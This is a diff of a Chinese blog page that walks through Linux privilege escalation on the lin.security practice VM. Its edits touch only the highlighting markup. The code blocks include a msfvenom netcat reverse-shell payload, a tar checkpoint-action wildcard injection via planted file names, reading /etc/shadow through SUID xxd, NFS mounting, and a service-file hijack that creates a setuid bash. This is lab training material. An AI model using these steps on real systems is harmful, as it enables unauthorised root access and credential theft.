@@ -325,8 +325,8 @@ lin.security 靶场 是 Linux 配置问题导致提权的靶场，它基于Ubunt
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">root❌0:0:root:/root:/bin/bash
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root❌0:0:root:/root:/bin/bash
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>如果有一个账户的第二列是密码哈希，如果该列为 x 则代表密码哈希存储在 <code>/etc/shadow</code> 文件上。而在 <code>lin.security</code> 虚拟机上可以看到像 <code>insecurity</code> 这么一个账户，这个账号的 <code>uid</code> 和 <code>gid</code> 都为 0。用类似 <code>Johnny</code> 或者 <code>hash-identifier</code> 会被表示成 <code>descrypt</code>，进而可以被破解出来。</p>
 <p><img
@@ -386,13 +386,13 @@ lin.security 靶场 是 Linux 配置问题导致提权的靶场，它基于Ubunt
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root@kali:~# msfvenom -p cmd/unix/reverse_netcat <span class="nv">lhost</span><span class="o">=</span>127.0.0.1 <span class="nv">lport</span><span class="o">=</span><span class="m">8888</span> R
-<span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Unix from the payload
-<span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: cmd from the payload
-No encoder or badchars specified, outputting raw payload
-Payload size: <span class="m">91</span> bytes
-mkfifo /tmp/kuhdq<span class="p">;</span> nc 127.0.0.1 <span class="m">8888</span> 0&lt;/tmp/kuhdq <span class="p">|</span> /bin/sh &gt;/tmp/kuhdq 2&gt;<span class="p">&amp;</span>1<span class="p">;</span> rm /tmp/kuhdq
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@kali:~# msfvenom -p cmd/unix/reverse_netcat <span class="nv">lhost</span><span class="o">=</span>127.0.0.1 <span class="nv">lport</span><span class="o">=</span><span class="m">8888</span> R
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: cmd from the payload
+</span></span><span class="line"><span class="cl">No encoder or badchars specified, outputting raw payload
+</span></span><span class="line"><span class="cl">Payload size: <span class="m">91</span> bytes
+</span></span><span class="line"><span class="cl">mkfifo /tmp/kuhdq<span class="p">;</span> nc 127.0.0.1 <span class="m">8888</span> 0&lt;/tmp/kuhdq <span class="p">|</span> /bin/sh &gt;/tmp/kuhdq 2&gt;<span class="p">&amp;</span>1<span class="p">;</span> rm /tmp/kuhdq
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>然后分别执行：</p>
 <div class="highlight"><div class="chroma">
@@ -402,10 +402,10 @@ mkfifo /tmp/kuhdq<span class="p">;</span> nc 127.0.0.1 <span class="m">8888</spa
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">bob@linsecurity:~$ <span class="nb">echo</span> <span class="s2">&#34;mkfifo /tmp/kuhdq; nc 127.0.0.1 8888 0&lt;/tmp/kuhdq | /bin/sh &gt;/tmp/kuhdq 2&gt;&amp;1; rm /tmp/kuhdq&#34;</span> &gt; shell.sh <span class="o">&amp;&amp;</span> chmod +x shell.sh
-bob@linsecurity:~$ <span class="nb">echo</span> <span class="s2">&#34;&#34;</span> &gt; <span class="s2">&#34;--checkpoint-action=exec=sh shell.sh&#34;</span>
-bob@linsecurity:~$ <span class="nb">echo</span> <span class="s2">&#34;&#34;</span> &gt; --checkpoint<span class="o">=</span><span class="m">1</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bob@linsecurity:~$ <span class="nb">echo</span> <span class="s2">&#34;mkfifo /tmp/kuhdq; nc 127.0.0.1 8888 0&lt;/tmp/kuhdq | /bin/sh &gt;/tmp/kuhdq 2&gt;&amp;1; rm /tmp/kuhdq&#34;</span> &gt; shell.sh <span class="o">&amp;&amp;</span> chmod +x shell.sh
+</span></span><span class="line"><span class="cl">bob@linsecurity:~$ <span class="nb">echo</span> <span class="s2">&#34;&#34;</span> &gt; <span class="s2">&#34;--checkpoint-action=exec=sh shell.sh&#34;</span>
+</span></span><span class="line"><span class="cl">bob@linsecurity:~$ <span class="nb">echo</span> <span class="s2">&#34;&#34;</span> &gt; --checkpoint<span class="o">=</span><span class="m">1</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>我们在另外一个会话终端开启 nc 监听：</p>
 <div class="highlight"><div class="chroma">
@@ -413,8 +413,8 @@ bob@linsecurity:~$ <span class="nb">echo</span> <span class="s2">&#34;&#34;</spa
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nc -lvnp <span class="m">8888</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lvnp <span class="m">8888</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><blockquote>
 <p>–checkpoint[=NUMBER] 显示每个Numbers记录的进度消息（默认值为10）
@@ -428,8 +428,8 @@ bob@linsecurity:~$ <span class="nb">echo</span> <span class="s2">&#34;&#34;</spa
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">find / -name <span class="s2">&#34;.*&#34;</span> -type f -path <span class="s2">&#34;/home/*&#34;</span> -exec ls -al <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find / -name <span class="s2">&#34;.*&#34;</span> -type f -path <span class="s2">&#34;/home/*&#34;</span> -exec ls -al <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -467,8 +467,8 @@ bob@linsecurity:~$ <span class="nb">echo</span> <span class="s2">&#34;&#34;</spa
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">find / -perm -4000 -type f -exec ls -la <span class="o">{}</span> 2&gt;/dev/null <span class="se">\;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find / -perm -4000 -type f -exec ls -la <span class="o">{}</span> 2&gt;/dev/null <span class="se">\;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>我们发现了如下一个文件 xxd。这个文件其实是命令文件，xxd 的作用是将一个文件以 16 进制的形式显示出来。他被配置了特殊权限，并且用户组为 itservices 是拥有执行权限 x 的。</p>
 <p><img
@@ -487,8 +487,8 @@ bob@linsecurity:~$ <span class="nb">echo</span> <span class="s2">&#34;&#34;</spa
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">xxd <span class="s2">&#34;/etc/shadow&#34;</span> <span class="p">|</span> xxd -r
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">xxd <span class="s2">&#34;/etc/shadow&#34;</span> <span class="p">|</span> xxd -r
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -550,10 +550,10 @@ bob@linsecurity:~$ <span class="nb">echo</span> <span class="s2">&#34;&#34;</spa
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">showmount IP // 连接的主机
-showmount -d IP // 目录
-showmount -a IP // 挂载点
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">showmount IP // 连接的主机
+</span></span><span class="line"><span class="cl">showmount -d IP // 目录
+</span></span><span class="line"><span class="cl">showmount -a IP // 挂载点
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>在 msf 中也有一个模块，可以用来列出导出文件夹：<code>auxiliary/scanner/nfs/nfsmount</code>。</p>
 <p><img
@@ -571,9 +571,9 @@ showmount -a IP // 挂载点
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">mkdir /mnt/peter
-mount 192.168.68.99:/home/peter /mnt/peter/
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir /mnt/peter
+</span></span><span class="line"><span class="cl">mount 192.168.68.99:/home/peter /mnt/peter/
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>挂载好的 peter 的家目录，显示的文件的所有者和所属组分别为 1001 和 1005</p>
 <p><img
@@ -626,10 +626,10 @@ mount 192.168.68.99:/home/peter /mnt/peter/
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo /etc/init.d/sshd start
-<span class="c1"># 或者</span>
-service sshd start
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo /etc/init.d/sshd start
+</span></span><span class="line"><span class="cl"><span class="c1"># 或者</span>
+</span></span><span class="line"><span class="cl">service sshd start
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>这种方法有两个缺点：</p>
 <p>一是启动时间长。init 进程是串行启动，只有前一个进程启动完，才会启动下一个进程。</p>
@@ -641,9 +641,9 @@ service sshd start
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 重启系统</span>
-sudo systemctl reboot
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 重启系统</span>
+</span></span><span class="line"><span class="cl">sudo systemctl reboot
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>查看 peter 用户的 systemd 配置，发现 peter 这个用户拥有 <code>debug.service</code> 文件，并且它对这个文件<strong>拥有读和写</strong>的权限。</p>
 <p><img
@@ -670,8 +670,8 @@ sudo systemctl reboot
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/bash \ncp /bin/bash /home/peter/systemdbash \nchmod 6755 /home/peter/systemdbash&#39;</span> &gt; /home/peter/systemdexpl.sh <span class="o">&amp;&amp;</span> chmod +x systemdexpl.sh
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/bash \ncp /bin/bash /home/peter/systemdbash \nchmod 6755 /home/peter/systemdbash&#39;</span> &gt; /home/peter/systemdexpl.sh <span class="o">&amp;&amp;</span> chmod +x systemdexpl.sh
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>修改 debug.service 文件来调用我们的脚本（root 调用 debug.service，而 debug.service 又调用我们的 systemdexpl.sh 脚本）修改 ExecStart 为当前脚本。</p>
 <p><img
@@ -710,7 +710,7 @@ sudo systemctl reboot
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
